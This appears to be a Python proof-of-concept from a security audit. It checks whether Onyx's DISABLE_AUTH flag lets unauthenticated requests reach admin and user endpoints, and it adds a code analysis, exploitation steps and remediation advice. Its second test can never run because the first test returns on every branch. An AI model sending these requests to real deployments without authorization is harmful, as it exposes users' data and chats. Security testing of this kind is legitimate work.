#!/usr/bin/env python3
"""
Proof of Concept: CRITICAL-001 - Authentication Bypass via DISABLE_AUTH

Vulnerability: The DISABLE_AUTH flag completely bypasses authentication checks
Location: /backend/onyx/auth/users.py:1104

This PoC demonstrates how an attacker can access admin endpoints without credentials
when DISABLE_AUTH is enabled.
"""

import requests
import os
import sys

# Test configuration
BASE_URL = os.environ.get("ONYX_URL", "http://localhost:8080")
API_BASE = f"{BASE_URL}/api"

def test_auth_bypass():
    """Test authentication bypass via DISABLE_AUTH"""

    print("=" * 80)
    print("PoC: CRITICAL-001 - Authentication Bypass via DISABLE_AUTH")
    print("=" * 80)
    print()

    # Test 1: Try to access admin endpoint without authentication
    print("[*] Test 1: Accessing admin endpoint without credentials...")

    headers = {
        "Content-Type": "application/json"
    }

    # Try to list all users (admin endpoint)
    response = requests.get(
        f"{API_BASE}/manage/admin/users",
        headers=headers,
        timeout=10
    )

    print(f"    Status Code: {response.status_code}")
    print(f"    Response Length: {len(response.text)}")

    if response.status_code == 200:
        print("    [!] VULNERABLE: Successfully accessed admin endpoint without auth!")
        print(f"    [!] Response preview: {response.text[:200]}...")
        return True
    elif response.status_code == 401:
        print("    [✓] NOT VULNERABLE: Authentication required (as expected)")
        return False
    else:
        print(f"    [?] UNKNOWN: Unexpected status code {response.status_code}")
        return None

    print()

    # Test 2: Try to access current user endpoint
    print("[*] Test 2: Accessing current user endpoint...")
    response = requests.get(
        f"{API_BASE}/me",
        headers=headers,
        timeout=10
    )

    print(f"    Status Code: {response.status_code}")

    if response.status_code == 200:
        print("    [!] VULNERABLE: Got user info without authentication!")
        try:
            user_data = response.json()
            print(f"    [!] User: {user_data}")
        except:
            pass
        return True
    elif response.status_code == 401:
        print("    [✓] NOT VULNERABLE: Authentication required")
        return False

    return None

def check_env_variable():
    """Check if DISABLE_AUTH is set in environment"""
    print("\n[*] Checking DISABLE_AUTH environment variable...")

    # This would need to be checked on the server, but we can check locally
    disable_auth = os.environ.get("DISABLE_AUTH", "").lower()

    if disable_auth == "true":
        print("    [!] CRITICAL: DISABLE_AUTH=true is SET!")
        print("    [!] This completely disables authentication!")
        return True
    else:
        print(f"    [i] Local DISABLE_AUTH value: {disable_auth or 'not set'}")
        print("    [i] Server-side value needs to be checked")
        return False

def code_analysis():
    """Analyze the vulnerable code"""
    print("\n" + "=" * 80)
    print("CODE ANALYSIS")
    print("=" * 80)

    print("""
VULNERABLE CODE in /backend/onyx/auth/users.py:1104:

    def current_user(
        user: User | None = Depends(optional_user_),
        disable_auth: bool = DISABLE_AUTH,  # <-- Gets value from config
    ) -> User | None:
        if disable_auth:  # <-- If True, bypasses all checks!
            return fetch_no_auth_user(get_session_with_current_tenant())
        # ... rest of auth logic

IMPACT:
- When DISABLE_AUTH=true, ALL authentication is bypassed
- Admin endpoints return None instead of rejecting
- Anyone can access any endpoint without credentials
- No audit trail of unauthorized access

EXPLOITATION:
1. If DISABLE_AUTH is set to true in production:
   - Access /api/manage/admin/users → Get all users
   - Access /api/manage/llm → Get LLM configurations
   - Access /api/chat/get-user-chat-sessions → Get all chats
   - Modify any data through admin endpoints

2. If attacker can set environment variables (e.g., via SSRF or container escape):
   - Set DISABLE_AUTH=true
   - Gain full system access

REMEDIATION:
1. Remove DISABLE_AUTH from production builds entirely
2. Use explicit dev-mode flag with strict validation:

   if os.environ.get("ENV") == "development":
       DISABLE_AUTH = os.environ.get("DEV_DISABLE_AUTH", "false") == "true"
   else:
       DISABLE_AUTH = False  # Always enforce in production

3. Add startup validation:

   if DISABLE_AUTH and os.environ.get("ENV") == "production":
       raise RuntimeError("DISABLE_AUTH cannot be enabled in production!")
    """)

def main():
    print("\n")
    print("╔" + "=" * 78 + "╗")
    print("║" + " " * 15 + "SECURITY POC - AUTHENTICATION BYPASS" + " " * 27 + "║")
    print("╚" + "=" * 78 + "╝")
    print()

    # Code analysis first
    code_analysis()

    # Environment check
    check_env_variable()

    # Live test
    print("\n" + "=" * 80)
    print("LIVE EXPLOIT TEST")
    print("=" * 80)
    print()
    print(f"[*] Target: {BASE_URL}")
    print()

    try:
        result = test_auth_bypass()

        print("\n" + "=" * 80)
        print("VALIDATION RESULT")
        print("=" * 80)

        if result is True:
            print("\n[!] VULNERABILITY CONFIRMED: Authentication can be bypassed!")
            print("[!] SEVERITY: CRITICAL")
            print("[!] RECOMMENDATION: Fix immediately (P0)")
            return 1
        elif result is False:
            print("\n[✓] VULNERABILITY NOT EXPLOITABLE: Authentication is enforced")
            print("[i] Note: This may still be vulnerable if DISABLE_AUTH is enabled")
            print("[i] Check server configuration")
            return 0
        else:
            print("\n[?] VULNERABILITY STATUS UNCLEAR: Manual verification needed")
            return 2

    except requests.exceptions.ConnectionError:
        print("\n[!] ERROR: Cannot connect to application")
        print(f"[!] Make sure the app is running at {BASE_URL}")
        print("\n[i] The vulnerability exists in the code regardless of live testing")
        print("[i] See CODE ANALYSIS section above for details")
        return 3
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        return 4

if __name__ == "__main__":
    sys.exit(main())
